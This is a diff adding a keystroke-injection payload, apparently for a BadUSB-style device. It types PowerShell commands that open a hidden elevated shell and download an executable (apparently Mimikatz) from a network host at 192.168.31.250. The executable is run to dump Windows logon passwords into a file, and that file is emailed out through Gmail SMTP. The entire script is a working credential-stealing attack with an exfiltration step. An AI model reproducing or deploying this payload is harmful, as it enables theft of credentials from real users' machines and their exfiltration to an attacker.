@@ -1,0 +1,12 @@
+Press:131+114
+CustomDelay:1
+Print:powershell -NoP -NonI -W Hidden -Exec Bypass "Start-Process cmd -A '/t:fe /k mode con lines=1 cols=18' -Verb runAs"
+Press:176
+Press:130+121
+Press:176
+Print:powershell -NoP -c "(new-object System.Net.WebClient).DownloadFile('http://192.168.31.250:8080/mi.exe','%TEMP%\\mi.exe');%TEMP%\\mi.exe "sekurlsa::logonPasswords full" > c:\\pwlog.txt"
+Press:176
+Print:powershell -c "$msg = new-object Net.Mail.MailMessage; $smtp = new-object Net.Mail.SmtpClient('smtp.gmail.com'); $smtp.EnableSsl = $true; $msg.From = 'xxxxxx@gmail.com'; $msg.To.Add('xxxxxx@gmail.com'); $msg.SubjectEncoding = [system.Text.Encoding]::Unicode; $msg.Subject = 'Test mail from PS'; $msg.Body = 'Test mail from PS '; $msg.Attachments.Add('c:\\\\pwlog.txt'); $smtp.Credentials = New-Object System.Net.NetworkCredential('xxxx@gmail.com', 'xxxxx');$smtp.Send($msg);exit"
+Press:176
+Print:exit
+Press:176
